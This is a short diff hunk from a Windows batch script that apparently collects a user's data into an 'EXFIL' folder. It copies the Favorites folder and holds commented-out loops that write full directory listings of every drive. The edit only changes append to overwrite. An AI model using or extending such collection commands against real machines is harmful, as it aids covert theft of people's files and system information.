@@ -174,10 +174,10 @@ xcopy /E /C /G /H /Y /Q "%USERPROFILE%\Favorites"                           "%EX
 
 REM @echo Full directory listing...
 rem Dir is more readable but *MUCH* larger
-REM for /f "skip=1" %%x in ('wmic logicaldisk get caption') do %%x & cd \ & dir /B /S %%x >> "%EXFIL_FILES%\Full_Dir_Listing.txt"
+REM for /f "skip=1" %%x in ('wmic logicaldisk get caption') do %%x & cd \ & dir /B /S %%x > "%EXFIL_FILES%\Full_Dir_Listing.txt"
 
 rem Tree is less readable
-REM for /f "skip=1" %%x in ('wmic logicaldisk get caption') do %%x & cd \ & tree /A /F %%x >> "%EXFIL_FILES%\Full_Dir_Listing.txt"
+REM for /f "skip=1" %%x in ('wmic logicaldisk get caption') do %%x & cd \ & tree /A /F %%x > "%EXFIL_FILES%\Full_Dir_Listing.txt"
 
 rem Tidy up...
 rem Change window title to path to cmd.exe (default)
